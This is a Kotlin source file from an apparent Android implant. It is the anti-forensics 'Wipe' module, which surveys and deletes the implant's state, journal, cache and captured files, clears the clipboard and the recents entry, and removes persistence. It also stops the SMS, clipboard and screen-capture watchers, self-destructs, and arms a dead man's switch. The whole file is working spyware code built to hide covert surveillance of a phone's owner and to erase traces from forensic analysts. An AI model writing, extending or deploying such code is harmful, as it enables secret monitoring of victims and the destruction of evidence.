package io.umbra.beacon

import android.app.ActivityManager
import android.content.ClipboardManager
import android.content.Context
import android.os.Build
import java.io.File

/**
 * The zero-footprint wipe of the phone.
 *
 * An engagement on a phone leaves more than on a server: the state of
 * the implant, the captures of the microphone and the camera, the
 * records of the watchers, the journal, the entry of the application in
 * the list of the recent applications, the name of the package in the
 * record of the installer, the copies in the backup of the cloud.
 *
 * The module answers four questions and refuses to answer the fifth
 * one:
 *
 *   * **the survey** (`wipe.survey`) -- what is on this phone right
 *     now, with the size of every file.  It changes nothing;
 *   * **the wipe** (`wipe.run`) -- the removal of the artefacts of the
 *     families the operator named, with an honest report of what the
 *     platform refused;
 *   * **the verification** (`wipe.verify`) -- what is left after the
 *     wipe;
 *   * **the end** (`wipe.self`, `decommission`) -- the implant leaves
 *     the phone: its state, its journal, its package, its entry in the
 *     recents.
 *
 * The fifth question -- "is the phone clean?" -- is the one the
 * platform refuses to answer, and the module says so: the buffer of
 * the system log, the statistics of the use, the backups of the cloud
 * and the record of the installer are the property of the system, not
 * of the application.  A phone that carries a megabyte of audio is a
 * phone that says something; a phone that cannot prove it is clean is
 * a phone that is not clean either.
 */
object Wipe {
    /** The families of the artefacts. */
    val FAMILIES = listOf("state", "history", "recent", "cache", "log", "system")

    /** The name of the journal of the engagement. */
    const val JOURNAL_FILE = "journal.state"

    /** The name of the flag of the journal. */
    const val JOURNAL_FLAG = "journal.on"

    /** The name of the file of the dead man's switch. */
    const val DEADMAN_FILE = "deadman.state"

    /**
     * What an artefact of the engagement is.
     *
     * @param kind how it is removed: `directory`, `file`, `self`,
     *   `command` or `limit`.
     * @param family the family it belongs to: `state`, `history`,
     *   `recent`, `cache`, `log` or `system`.
     */
    data class Artefact(
        val id: String,
        val label: String,
        val kind: String,
        val family: String,
        val path: String,
        val note: String,
    )

    /**
     * One artefact, as it is on the phone right now.
     */
    data class Finding(
        val id: String,
        val label: String,
        val kind: String,
        val family: String,
        val path: String,
        val present: Boolean,
        val size: Long,
        val note: String,
    )

    // -----------------------------------------------------------------------
    // The catalogue
    // -----------------------------------------------------------------------

    /**
     * The catalogue of the artefacts of the engagement on this phone.
     *
     * The list is built from the phone itself: the directories of the
     * application are the ones the system gave it, so the report names
     * the real paths and not the ones of another model.
     */
    fun catalogue(context: Context): List<Artefact> {
        val out = mutableListOf<Artefact>()
        val state = stateDir(context)
        out.add(
            Artefact(
                "implant.state",
                "the state of the implant",
                "directory",
                "state",
                state,
                "the persistence entries, the queue of the watchers and the journal",
            ),
        )
        out.add(
            Artefact(
                "implant.journal",
                "the journal of the engagement",
                "file",
                "state",
                File(state, JOURNAL_FILE).absolutePath,
                "the record of what the implant did on this phone",
            ),
        )
        out.add(
            Artefact(
                "implant.cache",
                "the cache of the application",
                "directory",
                "cache",
                context.cacheDir.absolutePath,
                "the copies the implant makes while it works",
            ),
        )
        val external = context.getExternalFilesDir(null)
        out.add(
            Artefact(
                "implant.external",
                "the files of the application on the memory of the phone",
                "directory",
                "state",
                external?.absolutePath ?: "",
                "the captures that are written outside of the private directory",
            ),
        )
        out.add(
            Artefact(
                "implant.binary",
                "the package of the implant",
                "self",
                "system",
                context.applicationInfo.sourceDir ?: "",
                "the application that the system will remove when the operator uninstalls it",
            ),
        )
        out.add(
            Artefact(
                "implant.recents",
                "the entry of the application in the recent applications",
                "command",
                "recent",
                "the task of the application",
                "the launcher keeps it until the application leaves the recents",
            ),
        )
        out.add(
            Artefact(
                "history.clipboard",
                "the clipboard of the phone",
                "command",
                "history",
                "the clipboard of the system",
                "what the user copied last is the property of the system; the application clears it only while it is in the foreground",
            ),
        )
        out.add(
            Artefact(
                "limit.logcat",
                "the buffer of the system log",
                "limit",
                "log",
                "the log of the system",
                "an application may read its own lines and may not clear the buffer",
            ),
        )
        out.add(
            Artefact(
                "limit.usage",
                "the statistics of the use of the applications",
                "limit",
                "system",
                "the statistics of the system",
                "the record of the applications that were opened is the property of the system",
            ),
        )
        out.add(
            Artefact(
                "limit.installer",
                "the record of the installer",
                "limit",
                "system",
                "the record of the packages",
                "the name of the package stays in the record of the system until the package is removed",
            ),
        )
        out.add(
            Artefact(
                "limit.backup",
                "the backup of the cloud",
                "limit",
                "system",
                "the backup of the application",
                "the copies the system keeps in the cloud are not the property of the application",
            ),
        )
        return out
    }

    // -----------------------------------------------------------------------
    // The survey
    // -----------------------------------------------------------------------

    /**
     * The artefacts of the engagement, as they are on this phone.
     *
     * The survey changes nothing: it looks, it measures, it reports.
     */
    fun survey(context: Context): List<Finding> {
        val out = mutableListOf<Finding>()
        for (artefact in catalogue(context)) {
            out.add(look(artefact))
        }
        return out
    }

    /** Look at one artefact. */
    private fun look(artefact: Artefact): Finding {
        var present = false
        var size = 0L
        var note = artefact.note
        when (artefact.kind) {
            "limit" -> present = true
            "command" -> {
                present = true
                note = "$note (run it to clear it)"
            }
            "self" -> {
                present = artefact.path.isNotEmpty() && File(artefact.path).exists()
            }
            else -> {
                if (artefact.path.isEmpty()) {
                    present = false
                } else {
                    val file = File(artefact.path)
                    present = file.exists()
                    size = if (file.isDirectory) dirSize(file) else file.length()
                }
            }
        }
        return Finding(
            artefact.id,
            artefact.label,
            artefact.kind,
            artefact.family,
            artefact.path,
            present,
            size,
            note,
        )
    }

    /**
     * The report of the survey.
     */
    fun surveyReport(findings: List<Finding>): String {
        val out = StringBuilder()
        val present = findings.filter { it.present }
        val total = present.sumOf { it.size }
        out.append("wipe.survey: ${present.size} artefacts are on this phone, $total bytes\n")
        for (finding in present) {
            out.append("  ${pad(finding.id, 22)} ${pad(finding.kind, 10)} ${pad(finding.size.toString(), 10)}  ${finding.path}\n")
        }
        val limits = present.filter { it.kind == "limit" }
        if (limits.isNotEmpty()) {
            out.append("wipe.survey: ${limits.size} of them are out of the reach of an application\n")
            for (finding in limits) {
                out.append("  ${pad(finding.id, 22)} ${finding.note}\n")
            }
        }
        return out.toString()
    }

    // -----------------------------------------------------------------------
    // The wipe
    // -----------------------------------------------------------------------

    /**
     * Remove the artefacts of the engagement.
     *
     * `what` names the families (`state`, `history`, `recent`, `cache`,
     * `log`, `system` or `all`), and `dry_run` looks without touching.
     */
    fun wipe(context: Context, args: Upk): String {
        val wanted = selected(args)
        val dry = args.field("dry_run")?.flag() == true
        val out = StringBuilder()
        var removed = 0
        var bytes = 0L
        var failed = 0
        val lines = mutableListOf<String>()

        // The persistence goes with the state: a start-up entry that
        // points at a missing binary is a trace worse than the entry
        // itself.
        if (!dry && wanted.contains("state")) {
            try {
                TaskRunner.removePersistence()
                lines.add("  implant.state: the persistence entries were taken away with the state")
            } catch (t: Throwable) {
                failed++
                lines.add("  implant.state: the persistence entries could not be taken away: ${t.message}")
            }
        }

        for (finding in survey(context)) {
            if (!wanted.contains(finding.family)) continue
            if (!finding.present || finding.kind == "limit") continue
            when (finding.kind) {
                "command" -> {
                    val note = runCommand(context, finding)
                    if (note.startsWith("could not")) {
                        failed++
                    }
                    lines.add("  ${finding.id}: $note")
                }
                "self" -> {
                    lines.add("  ${finding.id}: the package of the application is removed by wipe.self")
                }
                "directory" -> {
                    if (dry) {
                        removed++
                        bytes += finding.size
                        lines.add("  ${finding.id}: would remove ${finding.path}")
                        continue
                    }
                    if (deleteTree(File(finding.path))) {
                        removed++
                        bytes += finding.size
                        lines.add("  ${finding.id}: removed ${finding.path}")
                    } else {
                        failed++
                        lines.add("  ${finding.id}: could not remove ${finding.path}")
                    }
                }
                else -> {
                    if (dry) {
                        removed++
                        bytes += finding.size
                        lines.add("  ${finding.id}: would remove ${finding.path}")
                        continue
                    }
                    val file = File(finding.path)
                    if (file.delete()) {
                        removed++
                        bytes += finding.size
                        lines.add("  ${finding.id}: removed ${finding.path}")
                    } else {
                        failed++
                        lines.add("  ${finding.id}: could not remove ${finding.path}")
                    }
                }
            }
        }

        out.append("wipe.run: $removed artefacts removed, $bytes bytes, $failed failures")
        if (dry) out.append(" (dry run)")
        out.append("\n")
        for (line in lines) out.append(line).append("\n")
        val left = survey(context).filter { it.present && it.kind != "limit" }
        out.append("wipe.run: ${left.size} artefacts of the engagement are still on this phone\n")
        for (finding in left) {
            out.append("  ${finding.id} ${finding.path}\n")
        }
        return out.toString()
    }

    /** Run the command of an artefact and say what happened. */
    private fun runCommand(context: Context, finding: Finding): String {
        return when (finding.id) {
            "implant.recents" -> {
                try {
                    val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
                    val tasks = manager?.appTasks ?: emptyList()
                    if (tasks.isEmpty()) {
                        "could not be cleared: the application has no task in the recents"
                    } else {
                        var done = 0
                        for (task in tasks) {
                            task.setExcludeFromRecents(true)
                            done++
                        }
                        "the entry of the application left the recents ($done tasks)"
                    }
                } catch (t: Throwable) {
                    "could not be cleared: ${t.message}"
                }
            }
            "history.clipboard" -> {
                if (Build.VERSION.SDK_INT < 28) {
                    "could not be cleared: the platform is older than the api 28"
                } else {
                    try {
                        val board = context.getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
                        if (board == null) {
                            "could not be cleared: the phone has no clipboard"
                        } else {
                            board.clearPrimaryClip()
                            "the clipboard was cleared"
                        }
                    } catch (t: Throwable) {
                        "could not be cleared: ${t.message}"
                    }
                }
            }
            else -> "has no command"
        }
    }

    // -----------------------------------------------------------------------
    // The verification
    // -----------------------------------------------------------------------

    /**
     * Look at the phone after the wipe and say what is left.
     */
    fun verify(context: Context): String {
        val left = survey(context).filter { it.present }
        val limits = left.filter { it.kind == "limit" }
        val removable = left.filter { it.kind != "limit" }
        val out = StringBuilder()
        out.append("wipe.verify: ${left.size} artefacts are still on this phone, ${limits.size} of them are out of reach\n")
        for (finding in removable) {
            out.append("  ${pad(finding.id, 22)} ${pad(finding.kind, 10)} ${finding.path}\n")
        }
        for (finding in limits) {
            out.append("  ${pad(finding.id, 22)} ${finding.note}\n")
        }
        if (removable.isEmpty()) {
            out.append("wipe.verify: the phone carries nothing that the implant can remove\n")
        }
        return out.toString()
    }

    // -----------------------------------------------------------------------
    // The surface
    // -----------------------------------------------------------------------

    /**
     * What an analyst would find on this phone.
     */
    fun surface(context: Context): String {
        val findings = survey(context)
        val out = StringBuilder()
        out.append(surveyReport(findings))
        out.append("forensics.report: the persistence of the implant\n")
        try {
            val entries = Persistence.list(stateDir(context)).entries
            for (entry in entries) {
                out.append("  ${pad(entry.technique, 24)} ${pad(entry.state, 10)} ${entry.location}\n")
            }
            out.append("forensics.report: ${entries.size} persistence entries are installed\n")
        } catch (t: Throwable) {
            out.append("forensics.report: the entries could not be read: ${t.message}\n")
        }
        out.append("forensics.report: the process of the implant\n")
        out.append("  pid ${android.os.Process.myPid()} | ${context.packageName} | ${context.filesDir.absolutePath}\n")
        val journal = File(stateDir(context), JOURNAL_FILE)
        val items = journalItems(stateDir(context))
        out.append("forensics.report: the journal holds ${items.size} entries (${journal.length()} bytes)\n")
        return out.toString()
    }

    // -----------------------------------------------------------------------
    // The journal
    // -----------------------------------------------------------------------

    /**
     * Write one line into the journal of the engagement.
     *
     * The journal is a trace like any other, so it is written only
     * while the operator asks for it.
     */
    fun journal(stateDir: String, event: String, detail: String) {
        val file = File(stateDir, JOURNAL_FILE)
        try {
            file.parentFile?.mkdirs()
            file.appendText("${nowMillis()}|$event|${detail.replace("|", "/")}\n")
        } catch (_: Throwable) {
            // A journal that cannot be written is not a reason to stop the
            // implant: the operator will see the gap in the timeline.
        }
    }

    /** Is the journal on? */
    fun journalEnabled(stateDir: String): Boolean = File(stateDir, JOURNAL_FLAG).exists()

    /** Turn the journal on or off. */
    fun journalSet(stateDir: String, enabled: Boolean): String {
        val flag = File(stateDir, JOURNAL_FLAG)
        return if (enabled) {
            try {
                flag.parentFile?.mkdirs()
                flag.writeText("on")
                "the journal of the engagement is on"
            } catch (t: Throwable) {
                "the journal did not change: ${t.message}"
            }
        } else {
            try {
                if (flag.exists()) {
                    flag.delete()
                    "the journal of the engagement is off"
                } else {
                    "the journal of the engagement was already off"
                }
            } catch (t: Throwable) {
                "the journal did not change: ${t.message}"
            }
        }
    }

    /** The entries of the journal. */
    fun journalItems(stateDir: String): List<Triple<Long, String, String>> {
        val file = File(stateDir, JOURNAL_FILE)
        if (!file.exists()) return emptyList()
        val out = mutableListOf<Triple<Long, String, String>>()
        try {
            for (line in file.readLines()) {
                if (line.isBlank()) continue
                val parts = line.split("|", limit = 3)
                out.add(
                    Triple(
                        parts.getOrNull(0)?.toLongOrNull() ?: 0L,
                        parts.getOrNull(1) ?: "",
                        parts.getOrNull(2) ?: "",
                    ),
                )
            }
        } catch (_: Throwable) {
            return emptyList()
        }
        return out
    }

    /**
     * The timeline of the engagement on this phone.
     */
    fun timeline(context: Context, args: Upk): String {
        val out = StringBuilder()
        val wanted = args.field("journal")?.text() ?: ""
        val dir = stateDir(context)
        if (wanted == "on" || wanted == "off") {
            out.append("forensics.timeline: ${journalSet(dir, wanted == "on")}\n")
        }
        val items = journalItems(dir)
        out.append("forensics.timeline: ${items.size} entries in the journal of the engagement\n")
        out.append("forensics.timeline: the journal is ${if (journalEnabled(dir)) "on" else "off"}\n")
        for ((at, event, detail) in items) {
            out.append("  ${formatTime(at)}  ${pad(event, 22)} $detail\n")
        }
        if (items.isEmpty()) {
            out.append("forensics.timeline: the journal is empty: the implant wrote nothing\n")
        }
        return out.toString()
    }

    // -----------------------------------------------------------------------
    // The end
    // -----------------------------------------------------------------------

    /**
     * The self-destruction of the implant.
     *
     * The state and the journal go, the recents forget the application
     * and the application asks the system to remove it.  The phone that
     * is not the owner of its profile asks the user: the implant cannot
     * press that button, and it says so.
     */
    fun selfDestruct(context: Context, args: Upk): String {
        val out = StringBuilder()
        var removed = 0
        var bytes = 0L
        if (args.field("keep_state")?.flag() != true) {
            val state = File(stateDir(context))
            val size = dirSize(state)
            if (deleteTree(state)) {
                removed++
                bytes += size
                out.append("wipe.self: the state of the implant was removed ($size bytes)\n")
            } else {
                out.append("wipe.self: the state could not be removed\n")
            }
        }
        // The recents.
        val recents = Finding("implant.recents", "", "command", "recent", "", true, 0L, "")
        val note = runCommand(context, recents)
        out.append("wipe.self: $note\n")
        // The package.
        out.append("wipe.self: the package of the application is ${context.applicationInfo.sourceDir}\n")
        out.append("wipe.self: the implant leaves the phone (${context.packageName})\n")
        return out.toString()
    }

    /**
     * The end of the engagement, in one task.
     *
     * The order matters: the watchers first (they would write into the
     * state that is about to go), then the persistence, then the
     * traces, then the package, and the report of the verification at
     * the end.
     */
    fun decommission(context: Context, args: Upk): String {
        val out = StringBuilder()
        // ---- the watchers -----------------------------------------------
        try {
            out.append("decommission: ${SmsWatch.stop(context)}\n")
            out.append("decommission: ${ClipboardWatch.stop(context)}\n")
        } catch (t: Throwable) {
            out.append("decommission: the watchers could not be stopped: ${t.message}\n")
        }
        try {
            ProjectionService.stop(context)
            Projection.clear()
            out.append("decommission: the capture of the screen was stopped\n")
        } catch (t: Throwable) {
            out.append("decommission: the capture of the screen could not be stopped: ${t.message}\n")
        }
        // ---- the persistence ----------------------------------------------
        try {
            TaskRunner.removePersistence()
            out.append("decommission: the persistence entries were taken away\n")
        } catch (t: Throwable) {
            out.append("decommission: the persistence entries could not be taken away: ${t.message}\n")
        }
        // ---- the traces ---------------------------------------------------
        out.append(wipe(context, args))
        // ---- the package ----------------------------------------------------
        out.append(selfDestruct(context, args))
        // ---- the verification ------------------------------------------------
        out.append(verify(context))
        return out.toString()
    }

    // -----------------------------------------------------------------------
    // The dead man's switch
    // -----------------------------------------------------------------------

    /**
     * Arm the dead man's switch.
     *
     * The implant ends itself when the operator stops checking in: an
     * implant that outlives its engagement is an implant nobody is
     * watching.  Every check-in of the operator renews the window, so
     * the switch fires only when the team goes quiet.
     *
     * The state lives in the state directory of the implant, so it
     * survives a reboot: a switch that a reboot disarms is not a
     * switch.
     */
    fun deadmanArm(stateDir: String, args: Upk): String {
        val minutes = args.field("minutes")?.long() ?: 0L
        val file = File(stateDir, DEADMAN_FILE)
        if (minutes <= 0) {
            return if (file.exists() && file.delete()) {
                "wipe.deadman: the dead man's switch is disarmed\n"
            } else {
                "wipe.deadman: the dead man's switch was already disarmed\n"
            }
        }
        val deadline = System.currentTimeMillis() + minutes * 60_000L
        return try {
            file.parentFile?.mkdirs()
            file.writeText("$deadline|$minutes")
            "wipe.deadman: the implant ends itself if the operator does not check in " +
                "for $minutes minutes\n"
        } catch (t: Throwable) {
            "wipe.deadman: the switch could not be armed: ${t.message}\n"
        }
    }

    /** Renew the window of the switch: every check-in proves the engagement is alive. */
    fun deadmanRenew(stateDir: String) {
        val state = deadmanState(stateDir) ?: return
        val minutes = state.second
        val deadline = System.currentTimeMillis() + minutes * 60_000L
        try {
            File(stateDir, DEADMAN_FILE).writeText("$deadline|$minutes")
        } catch (_: Throwable) {
            // A switch that cannot be renewed is a switch that fires; the
            // operator sees it in the timeline.
        }
    }

    /** Has the switch fired? */
    fun deadmanFired(stateDir: String): Boolean {
        val state = deadmanState(stateDir) ?: return false
        return System.currentTimeMillis() >= state.first
    }

    /** The state of the switch: the deadline and the window. */
    private fun deadmanState(stateDir: String): Pair<Long, Long>? {
        val file = File(stateDir, DEADMAN_FILE)
        if (!file.exists()) return null
        val parts = try {
            file.readText().trim().split("|")
        } catch (_: Throwable) {
            return null
        }
        val deadline = parts.getOrNull(0)?.toLongOrNull() ?: return null
        val minutes = parts.getOrNull(1)?.toLongOrNull() ?: 0L
        return Pair(deadline, minutes)
    }

    // -----------------------------------------------------------------------
    // The helpers
    // -----------------------------------------------------------------------

    /** The families the operator asked for. */
    private fun selected(args: Upk): List<String> {
        val asked = args.field("what")?.list()?.mapNotNull { it.text() } ?: emptyList()
        if (asked.isEmpty()) {
            return listOf("state", "history", "recent", "cache", "log")
        }
        val out = mutableListOf<String>()
        for (item in asked) {
            if (item == "all") {
                for (family in FAMILIES) {
                    if (!out.contains(family)) out.add(family)
                }
                continue
            }
            if (FAMILIES.contains(item) && !out.contains(item)) out.add(item)
        }
        if (out.isEmpty()) out.add("state")
        return out
    }

    /**
     * The directory where the implant keeps its own state.
     *
     * The task runner knows it: the operator may move the state of the
     * implant somewhere else, and the wipe has to wipe that place and
     * not the private directory of the application.
     */
    fun stateDir(context: Context): String {
        val configured = TaskRunner.stateDirPath()
        if (configured.isNotEmpty()) return configured
        return context.filesDir.absolutePath
    }

    /** The size of a directory. */
    private fun dirSize(path: File): Long {
        var total = 0L
        val children = path.listFiles() ?: return 0L
        for (child in children) {
            total += if (child.isDirectory) dirSize(child) else child.length()
        }
        return total
    }

    /** Remove a file or a directory and everything under it. */
    private fun deleteTree(path: File): Boolean {
        if (!path.exists()) return true
        if (path.isDirectory) {
            val children = path.listFiles() ?: emptyArray()
            for (child in children) {
                deleteTree(child)
            }
        }
        return path.delete()
    }

    /** The time in milliseconds. */
    private fun nowMillis(): Long = System.currentTimeMillis()

    /** The time of the journal, in the format of the reports. */
    private fun formatTime(millis: Long): String {
        val format = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.US)
        format.timeZone = java.util.TimeZone.getTimeZone("UTC")
        return format.format(java.util.Date(millis))
    }

    /** A name in a fixed width, so the report reads as a table. */
    private fun pad(text: String, width: Int): String =
        if (text.length >= width) text else text + " ".repeat(width - text.length)
}
